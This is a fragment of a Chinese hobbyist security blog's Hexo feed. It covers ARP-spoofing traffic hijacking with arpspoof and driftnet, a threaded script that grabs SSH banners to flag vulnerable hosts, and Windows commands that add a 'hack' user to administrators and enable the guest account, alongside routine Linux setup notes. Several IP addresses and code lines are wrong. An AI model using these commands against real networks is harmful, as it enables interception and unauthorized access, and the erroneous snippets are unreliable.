        <content type="html"><![CDATA[<blockquote><p>Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗</p><p><a href="https://www.cnblogs.com/student-programmer/p/6729156.html" target="_blank" rel="noopener">引用</a></p></blockquote><a id="more"></a><h3 id="中间人流量劫持"><a href="#中间人流量劫持" class="headerlink" title="中间人流量劫持"></a>中间人流量劫持</h3><p><strong>arp欺骗原理概述</strong>：<br>被攻击者：<code>192.168.13.150</code><br>网关：<code>192.168.13.2</code><br>我：<code>192.138.13.151</code><br>arp在网络层，我先打开路由转发，然后进行arp广播，告诉被攻击者，我是网关，被攻击者的arp高速缓存表就会更新，认为我是网关；我告诉网关我是 被攻击者<code>192.168.13.150</code>,网关就会认为我是被攻击者<code>192.168.13.150</code>，最终达到流量劫持。</p><p><strong>单向</strong></p><p>流量：被攻击者-&gt;我-&gt;网关-&gt;被攻击者</p><p>欺骗被攻击主机，首先打开路由转发： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>执行命令，实现arp欺骗，让被攻击者（192.168.13.151）认为我是网关（192.168.13.2），流量劫持：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.13.151 192.168.13.2</span><br></pre></td></tr></table></figure><p>最后用wireshark,对抓到的包分析。</p><p><strong>双向</strong></p><p>流量：被攻击者-&gt;我-&gt;网关-&gt;我-&gt;被攻击者</p><p><strong>欺骗网关与被攻击主机</strong> </p><p>在单向的基础上，再对网关进行欺骗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.13.2 192.168.13.151</span><br></pre></td></tr></table></figure><p><strong>欺骗被攻击主机，并作iptable nat转发</strong></p><p>在单向的基础上，用iptables做NAT数据包转发</p><p>此处预留：iptables的链接</p><h3 id="流量捕获与监视"><a href="#流量捕获与监视" class="headerlink" title="流量捕获与监视"></a>流量捕获与监视</h3><p>捕捉图片</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取banner脚本</title>
      <link href="/2019/05/03/%E8%8E%B7%E5%8F%96banner%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/05/03/%E8%8E%B7%E5%8F%96banner%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>python脚本</p><p>banner：分析可知服务是否有漏洞</p></blockquote><a id="more"></a><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="通过sys模块输入的脚本"><a href="#通过sys模块输入的脚本" class="headerlink" title="通过sys模块输入的脚本"></a>通过sys模块输入的脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"参数个数不对"</span>)</span><br><span class="line">    print(<span class="string">"例如：./getBanner.py ip.txt"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBanner</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">2</span>)</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip,port))</span><br><span class="line">        banner=str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> banner</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulns</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    banner=getBanner(ip,port)</span><br><span class="line">    <span class="keyword">if</span> banner:</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'2.3.4'</span> <span class="keyword">in</span> banner):</span><br><span class="line">            print(ip+<span class="string">" vulnerable"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(ip+<span class="string">" unvulnerable"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(ip+<span class="string">" not get banner"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    filename=str(sys.argv[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">        print(<span class="string">"指定的不出有你在，重输入"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    port=<span class="number">22</span></span><br><span class="line">    filename=str(sys.argv[<span class="number">1</span>].strip())</span><br><span class="line">    f=open(filename,<span class="string">"r"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        ip=i.strip(<span class="string">"\n"</span>)</span><br><span class="line">        t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">        t.start()</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="通过os模块输入的脚本"><a href="#通过os模块输入的脚本" class="headerlink" title="通过os模块输入的脚本"></a>通过os模块输入的脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBanner</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">2</span>)</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip,port))</span><br><span class="line">        banner=str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> banner</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulns</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    banner=getBanner(ip,port)</span><br><span class="line">    <span class="keyword">if</span> banner:</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'2.3.4'</span> <span class="keyword">in</span> banner):</span><br><span class="line">            print(ip+<span class="string">" vulnerable"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(ip+<span class="string">" unvulnerable"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(ip+<span class="string">" not get banner"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    usage=<span class="string">"Usage: %prog -f &lt;filename&gt; -i &lt;ip address&gt;"</span></span><br><span class="line">    parser=OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">"-f"</span>,<span class="string">"--filename"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"filename"</span>,help=<span class="string">"ip address file"</span>) </span><br><span class="line">    parser.add_option(<span class="string">"-i"</span>,<span class="string">"--ip"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"address"</span>,help=<span class="string">"ip address"</span>)</span><br><span class="line">    (options,args)=parser.parse_args()</span><br><span class="line">    filename=options.filename</span><br><span class="line">    address=options.address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filename==<span class="literal">None</span> <span class="keyword">and</span> address==<span class="literal">None</span>):</span><br><span class="line">        print(<span class="string">"请指定文件地址或ip地址"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span>(filename):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">            print(<span class="string">"指定的文件不在，重输入"</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">    </span><br><span class="line">        port=<span class="number">22</span></span><br><span class="line">        f=open(filename,<span class="string">"r"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            ip=i.strip(<span class="string">"\n"</span>)</span><br><span class="line">            t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">            t.start()</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">if</span>(address):</span><br><span class="line">        prefix=address.split(<span class="string">"."</span>)[<span class="number">0</span>]+<span class="string">"."</span>+address.split(<span class="string">"."</span>)[<span class="number">1</span>]+<span class="string">"."</span>+address.split(<span class="string">"."</span>)[<span class="number">2</span>]+<span class="string">"."</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            ip=prefix+str(i)</span><br><span class="line">            port=<span class="number">22</span></span><br><span class="line">            t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="分步讲解"><a href="#分步讲解" class="headerlink" title="分步讲解"></a>分步讲解</h2><h3 id="引用模块socket"><a href="#引用模块socket" class="headerlink" title="引用模块socket"></a>引用模块socket</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socker</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect(<span class="string">"192.168.0.12"</span>,<span class="number">21</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h3 id="添加选择"><a href="#添加选择" class="headerlink" title="添加选择"></a>添加选择</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">"ok"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"no"</span>)</span><br></pre></td></tr></table></figure><p><strong>False,0,空值等同；其余皆为True</strong></p><h3 id="添加异常处理"><a href="#添加异常处理" class="headerlink" title="添加异常处理"></a>添加异常处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f=open(<span class="string">"ip.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><a href="https://www.w3cschool.cn/python/python-exceptions.html" target="_blank" rel="noopener">w3c异常处理</a></p><p><a href="https://www.runoob.com/python/python-exceptions.html" target="_blank" rel="noopener">菜鸟异常处理</a></p><h3 id="添加函数"><a href="#添加函数" class="headerlink" title="添加函数"></a>添加函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBanner</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulns</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> --name--==<span class="string">"main"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>–name–    判断是独立运行还是作为模块被导入</p><h3 id="添加for循环"><a href="#添加for循环" class="headerlink" title="添加for循环"></a>添加for循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    ip=<span class="string">"192.168.0."</span>+str(i)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> [<span class="number">21</span>,<span class="number">22</span>,<span class="number">80</span>]:</span><br><span class="line">    socket=ip+<span class="string">":"</span>+str(p)</span><br><span class="line">print(socket)</span><br></pre></td></tr></table></figure><p>print()自带换行</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">"ip.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">f.read()</span><br><span class="line">f.write()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><table><thead><tr><th>模式</th><th>作用</th></tr></thead><tbody><tr><td>r</td><td>读取</td></tr><tr><td>w</td><td>文件不存在则创建，存在则清空写入</td></tr><tr><td>a</td><td>追加</td></tr><tr><td></td><td></td></tr></tbody></table><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>write()</td><td>写入，不会加”\n”</td></tr><tr><td>read()</td><td>读取</td></tr><tr><td>resdline()</td><td>按行读</td></tr><tr><td>resdlines()</td><td>一次读取一个列表</td></tr><tr><td>seck()</td><td>指针</td></tr><tr><td>close()</td><td>关闭并保存</td></tr></tbody></table><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>import 模块名</p><p>from 模块名 import 函数名</p><h3 id="引用sys模块"><a href="#引用sys模块" class="headerlink" title="引用sys模块"></a>引用sys模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></table></figure><p>sys.argv 变量：</p><p>专门用来向Python解释器传递参数</p><p>类似于shell脚本编程中的位置变量</p><p>sys.exit() 方法：</p><p>退出当前程序</p><h3 id="引用os模块"><a href="#引用os模块" class="headerlink" title="引用os模块"></a>引用os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><p>os.path.isfile() 是否是文件</p><p>os.path.isdir() 是否是目录</p><p>os.path.exists() 是否存在</p><p>path：类，isfile(): 方法</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">t=Thread(target=要执行的函数，args=(响函数传递的的参数))<span class="comment">#args内的是元祖单个的为（a,）</span></span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>进程是线程的容器，线程是操作系统调度分配处理器时间的基本单位</p><h3 id="引用optparse模块"><a href="#引用optparse模块" class="headerlink" title="引用optparse模块"></a>引用optparse模块</h3><p>设置选项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">usage=<span class="string">"Usage: %prog -f &lt;filename&gt; -i &lt;address&gt;"</span></span><br><span class="line">parser=OptionParser(usage=usage)</span><br><span class="line">parser.add_option(<span class="string">"-f"</span>,<span class="string">"--file"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"filename[传递的参数]"</span>,help=<span class="string">"[帮助提示信息]"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-i"</span>,<span class="string">"--ip"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"address[传递的参数]"</span>,help=<span class="string">"[帮助提示信息]"</span>)</span><br><span class="line">(options,args)=parser.parse_args()</span><br></pre></td></tr></table></figure><p>-f,-i,-h</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows基础</title>
      <link href="/2019/03/20/windows%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/03/20/windows%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p>win基础</p></blockquote><a id="more"></a><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dxdiag</td><td>诊断工具</td></tr><tr><td>msconfig</td><td>系统配置（启动）</td></tr><tr><td>services.msc</td><td>服务</td></tr><tr><td>mstsc</td><td>远程桌面连接</td></tr><tr><td>gpedit.msc</td><td>本地组策略编辑器</td></tr><tr><td>regedit</td><td>注册表编辑器</td></tr><tr><td>ncpa.cpl</td><td>网络配置</td></tr><tr><td>notepad</td><td>记事本</td></tr><tr><td>control</td><td>控制面板</td></tr><tr><td>cmd</td><td>shell</td></tr><tr><td>calc</td><td>计算器</td></tr></tbody></table><h2 id="系统目录"><a href="#系统目录" class="headerlink" title="系统目录"></a>系统目录</h2><p>1.windows(系统安装目录)-&gt;System32(系统配置文件目录)-&gt;config-&gt;SAM  (pe)<br>2.Program Files/Program Files (x86)  (程序默认安装目录)<br>3.PerfLogs(日志)<br>4.用户-&gt;启动</p><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>命令 services.msc</p><table><thead><tr><th>名</th><th>作用</th></tr></thead><tbody><tr><td>dns</td><td>域名解析服务</td></tr><tr><td>dhcp</td><td>分发ip</td></tr><tr><td>telnet</td><td>远程连接</td></tr><tr><td>ssh</td><td>同上</td></tr><tr><td>ftp</td><td>上传下载</td></tr><tr><td>smb</td><td>文件共享</td></tr></tbody></table><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><table><thead><tr><th>服务</th><th>端口号</th></tr></thead><tbody><tr><td>http</td><td>80,8080,8090,3128,8081,9080</td></tr><tr><td>ftp</td><td>21</td></tr><tr><td>telnet</td><td>23</td></tr><tr><td>tftp</td><td>69/udp</td></tr><tr><td>ssh</td><td>22/tcp</td></tr><tr><td>pop3</td><td>110/tcp</td></tr><tr><td>tomcat</td><td>8080</td></tr><tr><td>win2003远程登录</td><td>3389</td></tr><tr><td>orical</td><td>1521</td></tr><tr><td>mysql mssql</td><td>1433/tcp,1433/udp</td></tr><tr><td>qq</td><td>1080/udp</td></tr></tbody></table><blockquote><p>通过端口可以 信息搜集，目标探测，服务判断，系统判断，系统角色分析</p></blockquote><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>命令：regedit</p><h2 id="编写批处理文件"><a href="#编写批处理文件" class="headerlink" title="编写批处理文件"></a>编写批处理文件</h2><h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>工具：U盘破解（sam）pe,lc5,彩虹表，hydra</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>win+e：计算机<br>ctrl+shift+esc:任务管理器<br>win+tab:3D桌面</p><h2 id="手动清除木马"><a href="#手动清除木马" class="headerlink" title="手动清除木马"></a>手动清除木马</h2><p>开机启动项：% Run<br>查询服务： services.msc<br>网络端口： netstat -o (-anp)</p><h2 id="dos命令"><a href="#dos命令" class="headerlink" title="dos命令"></a>dos命令</h2><blockquote><p>命令 /? 多查多用</p></blockquote><p><code>cmd</code>:</p><p>color a //cmd绿字黑底</p><p>ipconfig /all<br>ipconfig /release<br>ipconfig /renew<br>systeminfo 系统配置 (补丁)</p><p>arp -a</p><p>net view</p><p>shutdown -s -t 180 -c “hack”<br>shutdown -a</p><p>cls    //清屏</p><p>md seven    //创建文件夹<br>rd seven    //删除文件夹</p><p>copy con c:/seven.txt    //创建文件<br>hello seven<br>Ctrl+z</p><p>type seven.txt    //查看文件内容<br>start seven.txt    //打开文件查看内容<br>start <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>    //打开网页<br>del seven.txt    //删除文件</p><p>tree    //文件目录树形输出</p><p>copy 文件 位置<br>例 copy 1.txt c:\windows</p><p>ren //重命名</p><p>net start    //服务<br>net stop telnet<br>net start telnet</p><p>net user<br>net user hack 12314dsf /add<br>net user localgroup administrators hack /add<br>net user hack /del<br>net user guest /active:yes<br>net user guest 123345</p><p>net password 123456    //更改系统登录密码</p><p>net share    //查看本地开启的共享<br>net share k: ipc$<br>net share ipc$ /del<br>net share c$ /del</p><p>net use k: \ip\c$<br>net use k: \192.168.1.122\c$    //拽共享盘</p><p>netstat /?<br>schtasks /?</p>]]></content>
      
      
      
        <tags>
            
            <tag> windoes </tag>
            
            <tag> DOS命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali防火墙</title>
      <link href="/2019/03/20/kali%E4%B9%8B%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2019/03/20/kali%E4%B9%8B%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础配置</p></blockquote><a id="more"></a><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a><strong>防火墙</strong></h3><p><a href="https://blog.csdn.net/l1028386804/article/details/83110668" target="_blank" rel="noopener">冰河博客</a><br>kali关闭iptables<br>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ufw</span><br></pre></td></tr></table></figure><p>关闭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw disable # To disable the firewall</span><br></pre></td></tr></table></figure><p>开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw enable # To enable the firewall</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux ssh连接</title>
      <link href="/2019/03/20/kali%20ssh%E8%BF%9E%E6%8E%A5/"/>
      <url>/2019/03/20/kali%20ssh%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><p><a href="https://baike.baidu.com/item/ssh/10407?fr=aladdin" target="_blank" rel="noopener">百度百科</a></p></blockquote><a id="more"></a><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd.conf  #ssh配置文件</span><br><span class="line">PasswordAuthentication yes#允许密码链接</span><br><span class="line">PubkeyAuthentication yes#允许秘钥登录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status #查看状态</span><br><span class="line">/etc/init.d/ssh start #开启ssh</span><br><span class="line">/etc/init.d/ssh restart #重启ssh</span><br><span class="line">update-rc.d ssh enable #打开开机自启</span><br><span class="line">update-rc.d ssh disabled #关闭开机自启</span><br></pre></td></tr></table></figure><h3 id="服务器免密互联"><a href="#服务器免密互联" class="headerlink" title="服务器免密互联"></a>服务器免密互联</h3><p>修改hosts</p><p>修改hostname</p><p>可以通过hostname登录</p><p>ssh-keygen</p><p>生成秘钥，上传秘钥</p><p>修改sshd.config,开启秘钥登录</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 安装软件</title>
      <link href="/2019/03/20/kali%20%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/"/>
      <url>/2019/03/20/kali%20%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在Linux上安装软件包（deb,rpm..）</p></blockquote><a id="more"></a><h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a><strong>安装软件包</strong></h3><blockquote><p>浏览器插件，kali组件</p></blockquote><p><strong>中文输入法</strong><br>下载搜狗输入法(linux版)，在文件所在目录下，执行终端命令<code>dpkg -i 文件名.deb</code>安装软件<br><img src="/images/sougou1.jpg" alt><br>如缺依赖包，执行<code>apt-get install 依赖包名</code><br><img src="/images/sougou2.jpg" alt><br>按提示输入命令<code>apt --fix-broken install</code><br><img src="/images/sougou3.jpg" alt><br>再次执行<code>dpkg -i 文件名.deb</code><br><img src="/images/sougou4.jpg" alt><br>打开 fcitx配置<br><img src="/images/sougou5.jpg" alt><br><img src="/images/sougou6.jpg" alt></p><p>enjoy!</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
